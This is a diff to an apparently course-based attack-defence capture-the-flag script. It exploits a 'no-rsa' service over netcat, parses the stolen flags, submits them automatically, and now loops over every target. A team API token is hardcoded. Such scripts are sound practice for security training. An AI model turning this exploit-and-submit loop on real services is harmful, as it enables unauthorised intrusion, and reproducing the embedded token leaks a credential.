@@ -25,7 +25,7 @@ def exploit_no_rsa(hostname, port, flagId):
     print 'ret_list:', ret_list
     sigLine = ret_list[2]
     print 'sigline:',sigLine
-    lineArr = sigLine.split('\n')
+    lineArr = sigLine.split('\\n')
     print 'lineArr:', lineArr
     sig = lineArr[1]
     print 'sig:', sig
@@ -33,6 +33,15 @@ def exploit_no_rsa(hostname, port, flagId):
     print 'content:', content
     ret_list = netcat(hostname, port, content)
     print ret_list
+    flag_line = ret_list[1]
+    print 'flag_line:',flag_line 	
+    lineArr = flag_line.split('\\n')
+    print 'lineArr:', lineArr
+    flag_line = lineArr[1]
+    print 'flag_line:', flag_line
+    flag = flag_line.split(' ')[3]
+    print 'FLAG================================================================================================:',flag
+    print(t.submit_flag([flag]))	    
 
 t = Team("http://actf0.cse545.rev.fish/", "lpmrUtF4wT1mu5FnVN6Tt82LnK1j9n5d")
 print(t.game_url)
@@ -57,5 +66,8 @@ for service in services:
         port = target['port']
         flag_id = target['flag_id']
         if service_name == 'no-rsa':
-            exploit_no_rsa(hostname,port,flag_id)
-        break
+	    try:
+            	exploit_no_rsa(hostname,port,flag_id)
+	    except:
+		print('Exception occured for user')	
+        #break
